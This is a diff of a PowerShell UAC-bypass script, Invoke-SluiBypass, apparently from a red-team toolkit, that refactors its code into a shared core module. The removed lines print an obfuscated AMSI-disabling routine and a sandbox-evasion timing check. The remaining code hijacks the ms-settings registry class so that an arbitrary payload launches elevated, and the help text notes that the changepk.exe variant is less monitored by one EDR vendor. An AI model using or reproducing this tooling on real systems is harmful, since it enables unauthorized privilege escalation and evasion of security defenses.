@@ -49,17 +49,11 @@
     If specified, uses changepk.exe as the trigger instead of slui.exe.
     changepk.exe is less commonly monitored in older CS sensor versions.
 
-.PARAMETER SkipAMSI
-    Skip AMSI mitigation.
-
-.PARAMETER SkipChecks
-    Skip preflight environment checks.
-
 .PARAMETER Timeout
     Seconds to wait before cleanup (default: 5).
 
 .EXAMPLE
-    Invoke-SluiBypass -Payload "cmd.exe" -SkipChecks
+    Invoke-SluiBypass -Payload "cmd.exe"
 
 .EXAMPLE
     # Use changepk.exe variant
@@ -68,7 +62,8 @@
 .NOTES
     Authorized red/purple-team use only.  Requires written SOW.
     Minimum build: 14393 (RS1 / Anniversary Update).
-    Prefer Invoke-FodHelperBypass on builds < 14393.
+    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
+    AMSI mitigation and preflight checks.
 #>
 
 [CmdletBinding(SupportsShouldProcess)]
@@ -78,78 +73,21 @@ param(
     [string]$Payload,
 
     [switch]$UseChangePk,
-    [switch]$SkipAMSI,
-    [switch]$SkipChecks,
     [int]   $Timeout = 5
 )
 
 Set-StrictMode -Off
 $ErrorActionPreference = 'SilentlyContinue'
 
-#region ── AMSI mitigation ───────────────────────────────────────────────────
-if (-not $SkipAMSI) {
-    try {
-        $xA = [AppDomain]::CurrentDomain.GetAssemblies() |
-                  Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
-                  Select-Object -First 1
-        $xT = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
-        $xF = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
-        $xF.SetValue($null, $true)
-    } catch {}
-}
-#endregion
-
-#region ── Preflight gate ────────────────────────────────────────────────────
-if (-not $SkipChecks) {
-
-    try {
-        $xBld = [int](Get-ItemPropertyValue `
-                    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' `
-                    'CurrentBuildNumber' -EA Stop)
-    } catch { $xBld = [Environment]::OSVersion.Version.Build }
-    if ($xBld -lt 14393) {
-        Write-Warning "[Slui] Requires build 14393+ (RS1). Current: $xBld"
-        return
-    }
-
-    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
-                      [Security.Principal.WindowsIdentity]::GetCurrent())
-    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Write-Warning '[Slui] Already elevated — no bypass needed.'
-        return
-    }
-
-    $xUACPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
-    try   { $xBeh = [int](Get-ItemPropertyValue $xUACPath 'ConsentPromptBehaviorAdmin' -EA Stop) }
-    catch { $xBeh = 5 }
-    if ($xBeh -le 2) {
-        Write-Warning "[Slui] AlwaysNotify active (behavior=$xBeh) — method requires default UAC."
-        return
-    }
-
-    # Timing gate
-    $xH = [System.Security.Cryptography.SHA256]::Create()
-    $xB = [byte[]]::new(65536)
-    $xT0 = [DateTime]::UtcNow
-    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xB) }
-    $xH.Dispose()
-    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
-        Write-Warning '[Slui] Timing anomaly — aborting.'
-        return
-    }
+#region ── Core loader (for registry helpers) ────────────────────────────────
+if (-not (Get-Command 'Set-ShellClassCommand' -ErrorAction SilentlyContinue)) {
+    . "$PSScriptRoot\..\Core\Invoke-UACCore.ps1"
 }
 #endregion
 
 #region ── Registry key setup ────────────────────────────────────────────────
-$xRoot  = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
-$xCls   = 'ms-set' + 'tings'
-$xPath  = $xRoot + $xCls + '\Shell\Open\command'
-
 try {
-    New-Item -Path $xPath -Force | Out-Null
-    Set-ItemProperty  -Path $xPath -Name '(Default)'       -Value $Payload -Force
-    New-ItemProperty  -Path $xPath -Name 'DelegateExecute' -Value ''       `
-                      -PropertyType String -Force | Out-Null
+    Set-ShellClassCommand -ClassKey ('ms-set' + 'tings') -Payload $Payload
     Write-Verbose '[Slui] Registry key written.'
 }
 catch {
@@ -182,7 +120,7 @@ catch {
     Write-Warning "[Slui] Launch failed: $_"
 }
 finally {
-    Remove-Item -Path ($xRoot + $xCls) -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-ShellClassKey -ClassKey ('ms-set' + 'tings')
     Write-Verbose '[Slui] Registry cleanup complete.'
 }
 #endregion
